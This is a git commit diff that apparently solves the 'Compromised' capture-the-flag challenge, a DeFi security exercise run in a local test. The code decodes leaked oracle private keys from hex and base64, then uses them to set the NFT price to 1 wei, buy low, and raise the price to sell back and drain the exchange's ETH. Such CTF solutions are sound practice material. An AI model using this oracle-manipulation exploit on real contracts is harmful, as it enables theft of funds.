5db41ad517955727471843485b117df33f4a3ecd
pkqs90 <pkqs90@gmail.com>
2023-12-11 20:12:30 +0800

    #7 comprimise

--- test/compromised/compromised.challenge.js
+++ test/compromised/compromised.challenge.js
@@ -52,7 +52,36 @@ describe('Compromised challenge', function () {
     });
 
     it('Execution', async function () {
-        /** CODE YOUR SOLUTION HERE */
+        // Decode the hex string.
+        const hex0 = '4d 48 68 6a 4e 6a 63 34 5a 57 59 78 59 57 45 30 4e 54 5a 6b 59 54 59 31 59 7a 5a 6d 59 7a 55 34 4e 6a 46 6b 4e 44 51 34 4f 54 4a 6a 5a 47 5a 68 59 7a 42 6a 4e 6d 4d 34 59 7a 49 31 4e 6a 42 69 5a 6a 42 6a 4f 57 5a 69 59 32 52 68 5a 54 4a 6d 4e 44 63 7a 4e 57 45 35';
+        const hex1 = '4d 48 67 79 4d 44 67 79 4e 44 4a 6a 4e 44 42 68 59 32 52 6d 59 54 6c 6c 5a 44 67 34 4f 57 55 32 4f 44 56 6a 4d 6a 4d 31 4e 44 64 68 59 32 4a 6c 5a 44 6c 69 5a 57 5a 6a 4e 6a 41 7a 4e 7a 46 6c 4f 54 67 33 4e 57 5a 69 59 32 51 33 4d 7a 59 7a 4e 44 42 69 59 6a 51 34';
+        const base640 = Buffer.from(hex0.split(' ').join(''), 'hex').toString('utf8')
+        const base641 = Buffer.from(hex1.split(' ').join(''), 'hex').toString('utf8')
+        const privateKey0 = Buffer.from(base640, 'base64').toString('utf8');
+        const privateKey1 = Buffer.from(base641, 'base64').toString('utf8');
+
+        const signer0 = new ethers.Wallet(privateKey0, ethers.provider);
+        const signer1 = new ethers.Wallet(privateKey1, ethers.provider);
+
+        // Change price to 1 wei.
+        await oracle.connect(signer0).postPrice('DVNFT', 1);
+        await oracle.connect(signer1).postPrice('DVNFT', 1);
+
+        // Buy NFT.
+        await exchange.connect(player).buyOne({value: 1});
+
+        // Change price to exchange balance (to drain all eth).
+        const exchangeBalance = ethers.provider.getBalance(exchange.address);
+        await oracle.connect(signer0).postPrice('DVNFT', exchangeBalance);
+        await oracle.connect(signer1).postPrice('DVNFT', exchangeBalance);
+
+        // Sell NFT.
+        await nftToken.connect(player).approve(exchange.address, 0);
+        await exchange.connect(player).sellOne(0);
+
+        // Change price back to initial value.
+        await oracle.connect(signer0).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
+        await oracle.connect(signer1).postPrice('DVNFT', EXCHANGE_INITIAL_ETH_BALANCE);
     });
 
     after(async function () {
